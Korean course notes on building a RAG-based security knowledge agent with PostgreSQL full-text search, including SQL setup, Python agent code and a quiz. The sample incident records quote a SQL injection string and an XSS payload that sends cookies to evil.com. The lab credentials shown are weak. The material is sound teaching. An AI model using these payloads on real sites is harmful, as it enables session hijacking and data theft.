# Week 11: RAG 기반 보안 지식 에이전트

## 학습 목표

- RAG(Retrieval-Augmented Generation) 개념과 보안 에이전트에서의 활용을 이해한다
- 벡터 DB 없이 FTS(Full-Text Search) 기반 검색 시스템을 구축한다
- OpsClaw Experience 자동 승급 메커니즘을 활용한 지식 축적 체계를 구현한다
- 과거 인시던트를 참조하는 보안 에이전트를 구축한다
- 보안 교안/문서를 지식 소스로 활용하는 RAG 파이프라인을 완성한다

## 실습 환경 (공통)

| 서버 | IP | 역할 | 접속 |
|------|-----|------|------|
| opsclaw | 10.20.30.201 | Control Plane (OpsClaw) | `ssh opsclaw@10.20.30.201` (pw: 1) |
| secu | 10.20.30.1 | 방화벽/IPS (nftables, Suricata) | `sshpass -p1 ssh secu@10.20.30.1` |
| web | 10.20.30.80 | 웹서버 (JuiceShop:3000, Apache:80) | `sshpass -p1 ssh web@10.20.30.80` |
| siem | 10.20.30.100 | SIEM (Wazuh:443, OpenCTI:9400) | `sshpass -p1 ssh siem@10.20.30.100` |
| dgx-spark | 192.168.0.105 | AI/GPU (Ollama:11434) | 원격 API만 |

## 강의 시간 배분 (3시간)

| 시간 | 파트 | 내용 | 형태 |
|------|------|------|------|
| 0:00-0:25 | Part 1 | RAG 개념과 보안 에이전트 적용 | 이론 |
| 0:25-0:55 | Part 2 | FTS 기반 검색 엔진 구축 | 실습 |
| 0:55-1:25 | Part 3 | Experience 자동 승급 메커니즘 | 실습 |
| 1:25-1:35 | — | 휴식 | — |
| 1:35-2:10 | Part 4 | 과거 인시던트 참조 에이전트 | 실습 |
| 2:10-2:40 | Part 5 | 보안 교안 RAG 파이프라인 | 실습 |
| 2:40-3:00 | Part 6 | 종합 실습 + 퀴즈 | 실습+평가 |

## 용어 해설 (AI보안에이전트 과목)

| 용어 | 설명 | 예시 |
|------|------|------|
| **RAG** | Retrieval-Augmented Generation, 검색 증강 생성 | 관련 문서 검색 후 LLM에 전달 |
| **FTS** | Full-Text Search, 전문 검색 | PostgreSQL tsvector/tsquery |
| **Embedding** | 텍스트를 벡터(숫자 배열)로 변환 | "보안" → [0.12, -0.34, ...] |
| **Vector DB** | 벡터 유사도 검색에 특화된 데이터베이스 | Chroma, Pinecone, pgvector |
| **Chunk** | 긴 문서를 검색 단위로 분할한 조각 | 500자 단위로 분할 |
| **Context Window** | LLM이 한 번에 처리할 수 있는 토큰 수 | llama3.1:8b → 128K 토큰 |
| **Experience** | OpsClaw에 축적되는 에이전트 경험/지식 | 인시던트 대응 결과, 분석 리포트 |
| **승급(Promotion)** | Experience가 검증을 거쳐 지식으로 승급 | raw → verified → promoted |
| **Retrieval** | 질의에 관련된 문서/경험을 검색하는 과정 | "SSH 브루트포스" → 관련 경험 3건 |
| **Augmentation** | 검색 결과를 LLM 프롬프트에 추가하는 과정 | 프롬프트 + 참고문서 조합 |
| **Generation** | RAG로 증강된 프롬프트로 LLM이 응답 생성 | 맥락 있는 분석 결과 생성 |
| **Hallucination** | LLM이 사실과 다른 내용을 생성하는 현상 | 존재하지 않는 CVE 번호 생성 |
| **Grounding** | LLM 응답을 실제 데이터/문서에 근거하게 만드는 기법 | RAG가 대표적 grounding 기법 |
| **tsvector** | PostgreSQL의 전문 검색 데이터 타입 | 문서를 토큰화하여 인덱싱 |
| **tsquery** | PostgreSQL의 전문 검색 쿼리 타입 | 'ssh & brute & force' |
| **Relevance Score** | 검색 결과의 관련성 점수 | ts_rank 함수로 계산 |

---

## Part 1: RAG 개념과 보안 에이전트 적용 (0:00-0:25)

### 1.1 RAG가 필요한 이유

LLM은 학습 데이터에 포함된 지식만 가지고 있다. 보안 에이전트는 다음과 같은 최신/내부 정보가 필요하다:

| 정보 유형 | LLM만 | RAG 적용 |
|-----------|-------|----------|
| CVE 최신 정보 | 학습 시점까지만 | 실시간 DB 참조 |
| 내부 인프라 구성 | 모름 | 내부 문서 참조 |
| 과거 인시던트 이력 | 모름 | Experience DB 참조 |
| 조직 보안 정책 | 모름 | 정책 문서 참조 |
| 보안 교안/매뉴얼 | 부분적 | 전문 참조 |

### 1.2 RAG 파이프라인

```
1. Query | → | 2. Search| → | 3. Augment| → | 4. Generate
  (질의)  |  | (검색)  |  | (증강)  |  | (생성)

사용자 질문  FTS/벡터 검색  검색 결과를  LLM이 맥락 있는
관련 문서 추출  프롬프트에 추가  응답 생성
```

### 1.3 벡터 DB vs FTS

| 특성 | 벡터 DB | FTS (PostgreSQL) |
|------|---------|------------------|
| 검색 방식 | 의미적 유사도 | 키워드 매칭 |
| 추가 인프라 | Chroma/Pinecone 필요 | PostgreSQL 내장 |
| 정확도 | 의미적으로 우수 | 키워드 정확 매칭 |
| 설정 난이도 | Embedding 모델 필요 | SQL만으로 가능 |
| OpsClaw 호환 | 별도 구축 | 기존 DB 활용 |

OpsClaw는 벡터 DB 없이 PostgreSQL FTS로 RAG를 구현한다.
이는 추가 인프라 없이 기존 DB만으로 지식 검색이 가능하다.

---

## Part 2: FTS 기반 검색 엔진 구축 (0:25-0:55)

### 2.1 PostgreSQL FTS 기초

> **실습 목적**: 에이전트가 인시던트 대응을 자율적으로 수행하는 end-to-end 시나리오를 구현하기 위해 수행한다
>
> **배우는 것**: 탐지→분석→격리→복구→보고의 인시던트 대응 전체 사이클을 에이전트가 자율 수행하는 구조를 이해한다
>
> **결과 해석**: 각 대응 단계의 완료 여부와 소요 시간, 최종 보고서의 정확성으로 에이전트의 대응 능력을 평가한다
>
> **실전 활용**: 24/7 무인 보안 대응 시스템, 초기 대응 자동화, SOC Tier 1 업무 자동화에 활용한다

```bash
# PostgreSQL FTS 기본 실습
PGPASSWORD=opsclaw psql -h 127.0.0.1 -U opsclaw -d opsclaw << 'SQLEOF'
-- 1. tsvector 변환 테스트
SELECT to_tsvector('english', 'SSH brute force attack detected from 10.0.0.5');
-- 결과: '10.0.0.5':7 'attack':4 'brute':2 'detect':5 'forc':3 'ssh':1

-- 2. tsquery 매칭 테스트
SELECT to_tsvector('english', 'SSH brute force attack detected')
       @@ to_tsquery('english', 'ssh & brute & force');
-- 결과: true

-- 3. ts_rank로 관련성 점수 계산
SELECT ts_rank(
  to_tsvector('english', 'SSH brute force attack detected from 10.0.0.5'),
  to_tsquery('english', 'ssh & brute')
) AS relevance;
-- 관련성 점수 출력
SQLEOF
```

### 2.2 지식 테이블 생성

```bash
# 보안 지식 저장을 위한 테이블 생성
PGPASSWORD=opsclaw psql -h 127.0.0.1 -U opsclaw -d opsclaw << 'SQLEOF'
-- 보안 지식 테이블 (존재하지 않을 때만 생성)
CREATE TABLE IF NOT EXISTS security_knowledge (
    id SERIAL PRIMARY KEY,
    -- 분류: incident, policy, procedure, education
    category VARCHAR(50) NOT NULL,
    -- 제목
    title VARCHAR(200) NOT NULL,
    -- 본문 내용
    content TEXT NOT NULL,
    -- 태그 (검색 보조)
    tags TEXT[],
    -- 전문 검색 인덱스 컬럼
    search_vector tsvector,
    -- 출처
    source VARCHAR(200),
    -- 생성 시각
    created_at TIMESTAMP DEFAULT NOW()
);

-- tsvector 자동 업데이트 트리거
CREATE OR REPLACE FUNCTION update_search_vector()
RETURNS TRIGGER AS $$
BEGIN
    -- 제목(가중치 A)과 본문(가중치 B)을 합산하여 인덱스 생성
    NEW.search_vector :=
        setweight(to_tsvector('simple', COALESCE(NEW.title, '')), 'A') ||
        setweight(to_tsvector('simple', COALESCE(NEW.content, '')), 'B');
    RETURN NEW;
END;
$$ LANGUAGE plpgsql;

-- 기존 트리거 삭제 후 재생성
DROP TRIGGER IF EXISTS trg_search_vector ON security_knowledge;
CREATE TRIGGER trg_search_vector
    BEFORE INSERT OR UPDATE ON security_knowledge
    FOR EACH ROW
    EXECUTE FUNCTION update_search_vector();

-- GIN 인덱스 생성 (검색 성능 향상)
CREATE INDEX IF NOT EXISTS idx_sk_search ON security_knowledge USING GIN(search_vector);

SELECT 'security_knowledge 테이블 준비 완료' AS status;
SQLEOF
```

### 2.3 샘플 지식 데이터 삽입

```bash
# 보안 인시던트 / 정책 / 교안 샘플 데이터 삽입
PGPASSWORD=opsclaw psql -h 127.0.0.1 -U opsclaw -d opsclaw << 'SQLEOF'
-- 인시던트 사례 삽입
INSERT INTO security_knowledge (category, title, content, tags, source) VALUES
('incident', 'SSH 브루트포스 공격 대응',
 'SSH 브루트포스 공격이 10.0.0.5에서 감지됨. Wazuh 경보 rule_id 5710. 대응: nftables로 소스 IP 차단, fail2ban 활성화, SSH 포트 변경 검토. 결과: 30분 내 차단 완료, 추가 시도 없음.',
 ARRAY['ssh', 'brute-force', 'nftables', 'wazuh'],
 'incident-2026-001'),

('incident', 'SQL Injection 공격 탐지',
 'JuiceShop /rest/products/search에서 SQL Injection 시도 탐지. Suricata SID:2100498. 공격 페이로드: " OR 1=1--". BunkerWeb WAF에서 차단. 추가 조치: 입력 검증 강화, 파라미터화된 쿼리 적용.',
 ARRAY['sql-injection', 'juiceshop', 'suricata', 'waf'],
 'incident-2026-002'),

('incident', 'XSS 공격 및 세션 탈취 시도',
 'JuiceShop 댓글 기능에서 Stored XSS 발견. 공격자가 <script>document.location="http://evil.com/steal?c="+document.cookie</script> 삽입 시도. BunkerWeb CSP 헤더로 실행 차단. 추가 조치: 출력 인코딩 적용.',
 ARRAY['xss', 'session-hijack', 'csp', 'juiceshop'],
 'incident-2026-003'),

('policy', 'SSH 접근 제어 정책',
 '모든 서버의 SSH 접근은 다음 규칙을 따른다: 1) root 직접 로그인 금지 2) 키 기반 인증 권장 3) 비밀번호 인증 시 10회 실패 후 30분 차단 4) 관리 네트워크(10.20.30.0/24)에서만 접근 허용 5) SSH 로그 Wazuh 연동 필수.',
 ARRAY['ssh', 'access-control', 'policy'],
 'policy-sec-001'),

('policy', '인시던트 대응 절차',
 '보안 인시던트 발생 시 절차: 1) 탐지 및 분류 (Wazuh 경보 확인) 2) 초기 분석 (LLM 활용) 3) 격리 조치 (nftables 차단) 4) 상세 분석 (로그 상관분석) 5) 복구 6) 사후 보고서 작성 7) Experience 등록.',
 ARRAY['incident-response', 'procedure', 'wazuh'],
 'policy-ir-001'),

('education', 'nftables 방화벽 규칙 작성법',
 'nftables 기본 구조: table → chain → rule. 예시: nft add rule inet filter input tcp dport 22 accept (SSH 허용). nft add rule inet filter input tcp dport 22 ip saddr 10.0.0.0/8 accept (내부망만 SSH 허용). nft list ruleset (전체 규칙 조회).',
 ARRAY['nftables', 'firewall', 'tutorial'],
 'edu-nftables-001'),

('education', 'Wazuh 경보 분석 가이드',
 'Wazuh 경보 분석법: 1) rule_id로 경보 유형 파악 2) agent_id로 발생 서버 확인 3) data.srcip로 공격 출처 파악 4) rule_level >= 10은 즉시 대응 5) 동일 출처 반복 경보는 브루트포스 가능성. API: GET /alerts?q=rule.id:5710.',
 ARRAY['wazuh', 'alert', 'analysis', 'tutorial'],
 'edu-wazuh-001');

SELECT category, title FROM security_knowledge ORDER BY id;
SQLEOF
```

### 2.4 FTS 검색 테스트

```bash
# 다양한 검색 쿼리 테스트
PGPASSWORD=opsclaw psql -h 127.0.0.1 -U opsclaw -d opsclaw << 'SQLEOF'
-- 1. SSH 관련 지식 검색
SELECT title, category,
       ts_rank(search_vector, to_tsquery('simple', 'ssh')) AS score
FROM security_knowledge
WHERE search_vector @@ to_tsquery('simple', 'ssh')
ORDER BY score DESC;
-- SSH 관련 문서를 관련성 점수 순으로 정렬

-- 2. SQL Injection 관련 검색
SELECT title, category,
       ts_rank(search_vector, to_tsquery('simple', 'sql & injection')) AS score
FROM security_knowledge
WHERE search_vector @@ to_tsquery('simple', 'sql & injection')
ORDER BY score DESC;

-- 3. Wazuh 경보 관련 검색 (OR 연산)
SELECT title, category,
       ts_rank(search_vector, to_tsquery('simple', 'wazuh | alert')) AS score
FROM security_knowledge
WHERE search_vector @@ to_tsquery('simple', 'wazuh | alert')
ORDER BY score DESC;

-- 4. 부분 일치 검색 (prefix 매칭)
SELECT title, category
FROM security_knowledge
WHERE search_vector @@ to_tsquery('simple', 'brute:*');
-- brute로 시작하는 모든 토큰 매칭
SQLEOF
```

---

## Part 3: Experience 자동 승급 메커니즘 (0:55-1:25)

### 3.1 Experience 라이프사이클

```
검증  승급
  raw  | → | verified | → | promoted
  (생성)  |  | (검증됨) |  | (지식화)
에이전트가  사람/LLM이  RAG 검색에
자동 생성  정확성 확인  활용 가능
```

### 3.2 Experience 저장과 승급 구현

```python
#!/usr/bin/env python3
"""experience_manager.py — Experience 관리 및 자동 승급 시스템"""
import json
import time
import hashlib
import psycopg2

DB_CONFIG = {
    "host": "127.0.0.1",
    "port": 5432,
    "dbname": "opsclaw",
    "user": "opsclaw",
    "password": "opsclaw",
}

class ExperienceManager:
    """에이전트 Experience를 관리하고 지식으로 승급한다."""

    def __init__(self):
        self.conn = psycopg2.connect(**DB_CONFIG)
        # 테이블 초기화
        self._init_tables()

    def _init_tables(self):
        """Experience 테이블을 생성한다."""
        with self.conn.cursor() as cur:
            cur.execute("""
                CREATE TABLE IF NOT EXISTS agent_experience (
                    id SERIAL PRIMARY KEY,
                    agent_id VARCHAR(200) NOT NULL,
                    category VARCHAR(50) NOT NULL,
                    title VARCHAR(200) NOT NULL,
                    content TEXT NOT NULL,
                    tags TEXT[],
                    status VARCHAR(20) DEFAULT 'raw',
                    confidence FLOAT DEFAULT 0.0,
                    verified_by VARCHAR(100),
                    search_vector tsvector,
                    created_at TIMESTAMP DEFAULT NOW(),
                    promoted_at TIMESTAMP
                )
            """)
            # 검색 인덱스 생성
            cur.execute("""
                CREATE INDEX IF NOT EXISTS idx_exp_search
                ON agent_experience USING GIN(search_vector)
            """)
            self.conn.commit()

    def add_experience(self, agent_id: str, category: str,
                       title: str, content: str, tags: list) -> int:
        """새 Experience를 raw 상태로 추가한다."""
        with self.conn.cursor() as cur:
            cur.execute("""
                INSERT INTO agent_experience
                    (agent_id, category, title, content, tags, search_vector)
                VALUES (%s, %s, %s, %s, %s,
                    setweight(to_tsvector('simple', %s), 'A') ||
                    setweight(to_tsvector('simple', %s), 'B'))
                RETURNING id
            """, (agent_id, category, title, content, tags, title, content))
            exp_id = cur.fetchone()[0]
            self.conn.commit()
            # 생성 결과 출력
            print(f"[RAW] Experience #{exp_id} 생성: {title}")
            return exp_id

    def verify(self, exp_id: int, verifier: str, confidence: float):
        """Experience를 검증 상태로 전환한다."""
        with self.conn.cursor() as cur:
            cur.execute("""
                UPDATE agent_experience
                SET status = 'verified', verified_by = %s, confidence = %s
                WHERE id = %s
            """, (verifier, confidence, exp_id))
            self.conn.commit()
            print(f"[VERIFIED] Experience #{exp_id} 검증 완료 (confidence={confidence})")

    def promote(self, exp_id: int):
        """검증된 Experience를 지식으로 승급한다."""
        with self.conn.cursor() as cur:
            # 검증 상태 확인
            cur.execute(
                "SELECT status, confidence, title, content, tags, category "
                "FROM agent_experience WHERE id = %s", (exp_id,))
            row = cur.fetchone()
            if not row:
                print(f"[ERROR] Experience #{exp_id} 없음")
                return
            status, confidence, title, content, tags, category = row
            if status != 'verified':
                print(f"[ERROR] 검증되지 않은 Experience (status={status})")
                return
            if confidence < 0.7:
                print(f"[ERROR] 신뢰도 부족 (confidence={confidence}, 최소 0.7)")
                return

            # security_knowledge 테이블에 복사
            cur.execute("""
                INSERT INTO security_knowledge (category, title, content, tags, source)
                VALUES (%s, %s, %s, %s, %s)
            """, (category, title, content, tags, f"experience-{exp_id}"))
            # 승급 상태 업데이트
            cur.execute("""
                UPDATE agent_experience
                SET status = 'promoted', promoted_at = NOW()
                WHERE id = %s
            """, (exp_id,))
            self.conn.commit()
            print(f"[PROMOTED] Experience #{exp_id} → security_knowledge 승급 완료")

    def search(self, query: str, limit: int = 5) -> list:
        """FTS로 Experience를 검색한다."""
        with self.conn.cursor() as cur:
            cur.execute("""
                SELECT id, title, category, status, confidence,
                       ts_rank(search_vector, to_tsquery('simple', %s)) AS score
                FROM agent_experience
                WHERE search_vector @@ to_tsquery('simple', %s)
                ORDER BY score DESC
                LIMIT %s
            """, (query, query, limit))
            results = []
            for row in cur.fetchall():
                results.append({
                    "id": row[0], "title": row[1], "category": row[2],
                    "status": row[3], "confidence": row[4], "score": float(row[5]),
                })
            return results

    def close(self):
        """DB 연결을 종료한다."""
        self.conn.close()


if __name__ == "__main__":
    mgr = ExperienceManager()

    # 1. 에이전트가 Experience 생성
    exp1 = mgr.add_experience(
        agent_id="http://10.20.30.1:8002",
        category="incident",
        title="nftables 규칙 충돌로 인한 서비스 장애",
        content="nft add rule에서 기존 규칙과 충돌하여 SSH 접속 차단됨. "
                "원인: drop 규칙이 accept보다 먼저 매칭. "
                "해결: 규칙 순서 조정, accept 규칙을 먼저 배치.",
        tags=["nftables", "rule-conflict", "ssh", "outage"],
    )

    exp2 = mgr.add_experience(
        agent_id="http://10.20.30.80:8002",
        category="incident",
        title="JuiceShop 응답 지연 원인 분석",
        content="JuiceShop :3000 포트 응답 시간이 5초 이상으로 증가. "
                "원인: Node.js 이벤트 루프 블로킹. "
                "해결: 대량 검색 요청 rate-limiting 적용.",
        tags=["juiceshop", "latency", "rate-limit", "nodejs"],
    )

    # 2. LLM이 Experience 검증
    mgr.verify(exp1, verifier="llama3.1:8b", confidence=0.85)
    mgr.verify(exp2, verifier="llama3.1:8b", confidence=0.72)

    # 3. 검증된 Experience 승급
    mgr.promote(exp1)
    mgr.promote(exp2)

    # 4. 검색 테스트
    print("\n=== 검색: nftables ===")
    for r in mgr.search("nftables"):
        print(f"  [{r['status']}] {r['title']} (score={r['score']:.4f})")

    print("\n=== 검색: ssh ===")
    for r in mgr.search("ssh"):
        print(f"  [{r['status']}] {r['title']} (score={r['score']:.4f})")

    mgr.close()
```

```bash
# Experience 관리 스크립트 실행
cd /tmp
# experience_manager.py 파일로 저장 후 실행
python3 experience_manager.py
```

---

## Part 4: 과거 인시던트 참조 에이전트 (1:35-2:10)

### 4.1 RAG 에이전트 구현

```python
#!/usr/bin/env python3
"""rag_security_agent.py — RAG 기반 보안 지식 에이전트"""
import json
import requests
import psycopg2

OLLAMA_URL = "http://192.168.0.105:11434"
DB_CONFIG = {
    "host": "127.0.0.1",
    "port": 5432,
    "dbname": "opsclaw",
    "user": "opsclaw",
    "password": "opsclaw",
}

class RAGSecurityAgent:
    """과거 인시던트와 지식을 참조하여 보안 분석을 수행하는 에이전트."""

    def __init__(self, model: str = "llama3.1:8b"):
        self.model = model
        self.conn = psycopg2.connect(**DB_CONFIG)

    def retrieve(self, query: str, limit: int = 3) -> list:
        """FTS로 관련 지식을 검색한다."""
        # 쿼리를 FTS 형식으로 변환 (공백을 &로 치환)
        words = query.strip().split()
        tsquery = " & ".join(w for w in words if len(w) > 1)
        if not tsquery:
            return []

        with self.conn.cursor() as cur:
            cur.execute("""
                SELECT title, content, category, source,
                       ts_rank(search_vector, to_tsquery('simple', %s)) AS score
                FROM security_knowledge
                WHERE search_vector @@ to_tsquery('simple', %s)
                ORDER BY score DESC
                LIMIT %s
            """, (tsquery, tsquery, limit))
            results = []
            for row in cur.fetchall():
                results.append({
                    "title": row[0],
                    "content": row[1],
                    "category": row[2],
                    "source": row[3],
                    "score": float(row[4]),
                })
            return results

    def augment_prompt(self, question: str, context_docs: list) -> str:
        """검색 결과를 프롬프트에 추가한다."""
        context_text = ""
        for i, doc in enumerate(context_docs, 1):
            # 각 참고 문서를 번호와 함께 추가
            context_text += f"\n--- 참고문서 {i} ({doc['category']}: {doc['title']}) ---\n"
            context_text += doc["content"]
            context_text += f"\n(출처: {doc['source']}, 관련성: {doc['score']:.4f})\n"

        prompt = f"""다음 참고 문서를 바탕으로 질문에 답하세요.
반드시 참고 문서의 내용을 근거로 답하고, 문서에 없는 내용은 "해당 정보 없음"이라고 명시하세요.

{context_text}

질문: {question}

답변 형식:
1. 요약 (1-2문장)
2. 상세 분석
3. 권장 조치
4. 참고한 문서"""
        return prompt

    def generate(self, system_prompt: str, user_prompt: str) -> str:
        """LLM에 질의하여 응답을 생성한다."""
        resp = requests.post(
            f"{OLLAMA_URL}/api/chat",
            json={
                "model": self.model,
                "messages": [
                    {"role": "system", "content": system_prompt},
                    {"role": "user", "content": user_prompt},
                ],
                "stream": False,
            },
            timeout=120,
        )
        return resp.json()["message"]["content"]

    def ask(self, question: str) -> dict:
        """RAG 파이프라인 전체를 실행한다."""
        print(f"[질의] {question}")

        # 1. Retrieve — 관련 지식 검색
        print("[검색] FTS 검색 중...")
        docs = self.retrieve(question)
        print(f"  → {len(docs)}건 검색됨")
        for d in docs:
            print(f"    [{d['category']}] {d['title']} (score={d['score']:.4f})")

        # 2. Augment — 프롬프트 증강
        augmented = self.augment_prompt(question, docs)

        # 3. Generate — LLM 응답 생성
        print("[생성] LLM 분석 중...")
        system_prompt = (
            "당신은 OpsClaw 보안 분석 전문가입니다. "
            "제공된 참고 문서를 근거로 정확한 분석을 제공하세요. "
            "추측이나 불확실한 정보는 명시적으로 표시하세요."
        )
        answer = self.generate(system_prompt, augmented)
        print(f"[완료] 응답 생성됨 ({len(answer)}자)")

        return {
            "question": question,
            "retrieved_docs": len(docs),
            "doc_titles": [d["title"] for d in docs],
            "answer": answer,
        }

    def close(self):
        """DB 연결을 종료한다."""
        self.conn.close()


if __name__ == "__main__":
    agent = RAGSecurityAgent()

    # 테스트 질문들
    questions = [
        "SSH 브루트포스 공격이 감지되었을 때 어떻게 대응해야 하나요?",
        "JuiceShop에서 SQL Injection을 탐지하는 방법은?",
        "nftables 방화벽 규칙은 어떻게 작성하나요?",
    ]

    for q in questions:
        print("\n" + "=" * 60)
        result = agent.ask(q)
        print(f"\n답변:\n{result['answer'][:500]}")
        print(f"\n참조 문서: {result['doc_titles']}")

    agent.close()
```

### 4.2 RAG 에이전트 실행

```bash
# RAG 에이전트 실행 (Ollama와 PostgreSQL이 실행 중이어야 함)
cd /tmp
# rag_security_agent.py 파일로 저장 후 실행
python3 rag_security_agent.py
```

### 4.3 OpsClaw를 통한 RAG 활용

```bash
# OpsClaw dispatch로 RAG 검색 수행
export OPSCLAW_API_KEY=opsclaw-api-key-2026

# 프로젝트 생성
RESP=$(curl -s -X POST http://localhost:8000/projects \
  -H "Content-Type: application/json" \
  -H "X-API-Key: $OPSCLAW_API_KEY" \
  -d '{"name":"week11-rag-agent","request_text":"RAG 기반 보안 분석","master_mode":"external"}')
# 프로젝트 ID 추출
RAG_PID=$(echo "$RESP" | python3 -c "import sys,json; print(json.load(sys.stdin)['project']['id'])")

# Stage 전환
curl -s -X POST "http://localhost:8000/projects/${RAG_PID}/plan" \
  -H "X-API-Key: $OPSCLAW_API_KEY" > /dev/null
# execute 단계 전환
curl -s -X POST "http://localhost:8000/projects/${RAG_PID}/execute" \
  -H "X-API-Key: $OPSCLAW_API_KEY" > /dev/null

# DB에서 관련 지식 검색 후 LLM에 전달하는 파이프라인
curl -s -X POST "http://localhost:8000/projects/${RAG_PID}/dispatch" \
  -H "Content-Type: application/json" \
  -H "X-API-Key: $OPSCLAW_API_KEY" \
  -d '{
    "command": "PGPASSWORD=opsclaw psql -h 127.0.0.1 -U opsclaw -d opsclaw -t -c \"SELECT title || ': ' || content FROM security_knowledge WHERE search_vector @@ to_tsquery('simple','ssh & brute') ORDER BY ts_rank(search_vector, to_tsquery('simple','ssh & brute')) DESC LIMIT 3\"",
    "subagent_url": "http://localhost:8002"
  }' | python3 -m json.tool
# SSH 브루트포스 관련 지식 3건 검색
```

---

## Part 5: 보안 교안 RAG 파이프라인 (2:10-2:40)

### 5.1 교안 콘텐츠 인덱싱

```bash
# 보안 교안 파일을 DB에 인덱싱
cat > /tmp/index_education.py << 'PYEOF'
#!/usr/bin/env python3
"""index_education.py — 보안 교안을 FTS 인덱스로 등록한다."""
import os
import psycopg2

DB_CONFIG = {
    "host": "127.0.0.1",
    "port": 5432,
    "dbname": "opsclaw",
    "user": "opsclaw",
    "password": "opsclaw",
}

EDUCATION_DIR = "/home/opsclaw/opsclaw/contents/education"

def chunk_text(text: str, chunk_size: int = 500) -> list:
    """텍스트를 chunk_size 단위로 분할한다."""
    lines = text.split("\n")
    chunks = []
    current = []
    current_len = 0
    for line in lines:
        current.append(line)
        current_len += len(line)
        if current_len >= chunk_size:
            # chunk_size에 도달하면 청크 저장
            chunks.append("\n".join(current))
            current = []
            current_len = 0
    if current:
        chunks.append("\n".join(current))
    return chunks

def index_file(conn, filepath: str):
    """단일 교안 파일을 인덱싱한다."""
    with open(filepath, "r", encoding="utf-8") as f:
        content = f.read()

    # 파일 경로에서 메타 정보 추출
    parts = filepath.split("/")
    course = [p for p in parts if p.startswith("course")]
    week = [p for p in parts if p.startswith("week")]
    title = f"{course[0] if course else 'unknown'}/{week[0] if week else 'unknown'}"

    # 청킹 후 각 청크를 DB에 삽입
    chunks = chunk_text(content, 500)
    with conn.cursor() as cur:
        for i, chunk in enumerate(chunks):
            cur.execute("""
                INSERT INTO security_knowledge (category, title, content, tags, source)
                VALUES ('education', %s, %s, %s, %s)
                ON CONFLICT DO NOTHING
            """, (
                f"{title} (chunk {i+1})",
                chunk,
                [course[0]] if course else [],
                filepath,
            ))
    conn.commit()
    # 인덱싱 결과 출력
    print(f"[INDEX] {title}: {len(chunks)}개 청크 인덱싱")

def main():
    """교안 디렉토리를 순회하며 인덱싱한다."""
    conn = psycopg2.connect(**DB_CONFIG)

    # 교안 파일 탐색 (lecture.md 파일만)
    count = 0
    for root, dirs, files in os.walk(EDUCATION_DIR):
        for f in files:
            if f == "lecture.md":
                filepath = os.path.join(root, f)
                index_file(conn, filepath)
                count += 1

    print(f"\n총 {count}개 교안 파일 인덱싱 완료")
    conn.close()

if __name__ == "__main__":
    main()
PYEOF
# 교안 인덱싱 스크립트 실행
python3 /tmp/index_education.py
```

### 5.2 교안 기반 질의응답 테스트

```bash
# 인덱싱된 교안에서 정보 검색
PGPASSWORD=opsclaw psql -h 127.0.0.1 -U opsclaw -d opsclaw << 'SQLEOF'
-- 교안에서 nftables 관련 내용 검색
SELECT title,
       ts_rank(search_vector, to_tsquery('simple', 'nftables & rule')) AS score,
       LEFT(content, 150) AS preview
FROM security_knowledge
WHERE category = 'education'
  AND search_vector @@ to_tsquery('simple', 'nftables & rule')
ORDER BY score DESC
LIMIT 5;

-- 전체 인덱싱된 교안 수 확인
SELECT category, COUNT(*) AS cnt
FROM security_knowledge
GROUP BY category
ORDER BY cnt DESC;
SQLEOF
```

### 5.3 지식 소스 품질 평가

```python
#!/usr/bin/env python3
"""knowledge_quality.py — 지식 소스의 품질을 평가한다."""
import psycopg2

DB_CONFIG = {
    "host": "127.0.0.1",
    "port": 5432,
    "dbname": "opsclaw",
    "user": "opsclaw",
    "password": "opsclaw",
}

def evaluate_quality():
    """지식 DB의 품질 메트릭을 계산한다."""
    conn = psycopg2.connect(**DB_CONFIG)
    with conn.cursor() as cur:
        # 카테고리별 문서 수
        cur.execute("""
            SELECT category, COUNT(*) AS cnt,
                   AVG(LENGTH(content)) AS avg_len
            FROM security_knowledge
            GROUP BY category
        """)
        print("=== 카테고리별 통계 ===")
        for row in cur.fetchall():
            # 카테고리별 문서 수와 평균 길이 출력
            print(f"  {row[0]}: {row[1]}건, 평균 {int(row[2])}자")

        # 태그 분포
        cur.execute("""
            SELECT unnest(tags) AS tag, COUNT(*) AS cnt
            FROM security_knowledge
            WHERE tags IS NOT NULL
            GROUP BY tag
            ORDER BY cnt DESC
            LIMIT 10
        """)
        print("\n=== 상위 태그 ===")
        for row in cur.fetchall():
            print(f"  {row[0]}: {row[1]}건")

        # 검색 커버리지 테스트
        test_queries = ["ssh", "wazuh", "nftables", "xss", "sql injection"]
        print("\n=== 검색 커버리지 ===")
        for q in test_queries:
            tsq = q.replace(" ", " & ")
            cur.execute("""
                SELECT COUNT(*) FROM security_knowledge
                WHERE search_vector @@ to_tsquery('simple', %s)
            """, (tsq,))
            cnt = cur.fetchone()[0]
            # 각 쿼리의 검색 결과 수 출력
            coverage = "OK" if cnt > 0 else "GAP"
            print(f"  [{coverage}] '{q}': {cnt}건")

    conn.close()

if __name__ == "__main__":
    evaluate_quality()
```

---

## Part 6: 종합 실습 + 퀴즈 (2:40-3:00)

### 6.1 종합 과제

다음 RAG 파이프라인을 완성하라:

1. security_knowledge 테이블에 5건 이상의 인시던트 사례를 추가
2. FTS로 "XSS 공격"을 검색하여 관련 문서를 추출
3. 검색 결과를 LLM 프롬프트에 삽입하여 대응 방안을 생성
4. 생성된 대응 방안을 Experience로 저장하고 승급

### 6.2 퀴즈

**Q1.** RAG의 3단계(Retrieve-Augment-Generate)를 각각 설명하고, 보안 에이전트에서 각 단계의 역할을 서술하시오.

**Q2.** 벡터 DB와 FTS 기반 검색의 차이점을 비교하고, OpsClaw가 FTS를 선택한 이유를 설명하시오.

**Q3.** Experience의 raw → verified → promoted 승급 과정에서 각 단계의 의미와 전환 조건을 설명하시오.

**Q4.** RAG를 사용하지 않고 LLM만으로 보안 분석을 수행할 때의 문제점 3가지를 나열하시오.

**Q5.** 다음 FTS 쿼리의 의미를 설명하시오:
```sql
SELECT title FROM security_knowledge
WHERE search_vector @@ to_tsquery('simple', 'ssh & brute & force')
ORDER BY ts_rank(search_vector, to_tsquery('simple', 'ssh & brute & force')) DESC
LIMIT 3;
```
